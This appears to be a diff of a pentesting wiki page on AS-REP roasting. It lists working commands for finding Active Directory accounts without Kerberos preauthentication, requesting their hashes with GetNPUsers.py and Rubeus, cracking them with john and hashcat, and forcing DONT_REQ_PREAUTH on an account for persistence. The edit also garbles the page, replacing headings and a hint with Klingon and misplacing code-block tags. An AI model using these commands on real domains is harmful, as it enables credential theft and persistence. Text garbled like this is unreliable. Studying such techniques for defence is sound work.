@@ -45,15 +45,15 @@ The main requirements for this attack are:
 ```bash
 Get-DomainUser -PreauthNotRequired -verbose #List vuln users using PowerView
 ```
-{% endcode %}
-
 {% code title="Using Linux" %}
+
+{% endcode %}
 ```bash
-bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 get search --filter '(&(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' --attr sAMAccountName  
+bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 get search --filter '(&(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' --attr sAMAccountName
 ```
 {% endcode %}
 
-#### Request AS\_REP message
+#### AS_REP message jatlh
 
 {% code title="Using Linux" %}
 ```bash
@@ -62,8 +62,6 @@ python GetNPUsers.py jurassic.park/ -usersfile usernames.txt -format hashcat -ou
 #Use domain creds to extract targets and target them
 python GetNPUsers.py jurassic.park/triceratops:Sh4rpH0rns -request -format hashcat -outputfile hashes.asreproast
 ```
-{% endcode %}
-
 {% code title="Using Windows" %}
 ```bash
 .\Rubeus.exe asreproast /format:hashcat /outfile:hashes.asreproast [/user:username]
@@ -77,22 +75,26 @@ AS-REP Roasting with Rubeus will generate a 4768 with an encryption type of 0x17
 
 ### Cracking
 
+{% code title="Klingon" %}
+{% hint style="warning" %}
+Rubeus jIbogh AS-REP Roasting vItlhutlh 0x17 encryption type je preauth type je 4768 ghap.
+{% endhint %}
+{% endcode %}
 ```bash
 john --wordlist=passwords_kerb.txt hashes.asreproast
-hashcat -m 18200 --force -a 0 hashes.asreproast passwords_kerb.txt 
+hashcat -m 18200 --force -a 0 hashes.asreproast passwords_kerb.txt
 ```
+### Qap
 
-### Persistence
-
-Force **preauth** not required for a user where you have **GenericAll** permissions (or permissions to write properties):
+**preauth** not required for a user where you have **GenericAll** permissions (or permissions to write properties):
 
 {% code title="Using Windows" %}
 ```bash
 Set-DomainObject -Identity <username> -XOR @{useraccountcontrol=4194304} -Verbose
 ```
-{% endcode %}
-
 {% code title="Using Linux" %}
+
+{% endcode %}
 ```bash
 bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 add uac -f DONT_REQ_PREAUTH
 ```
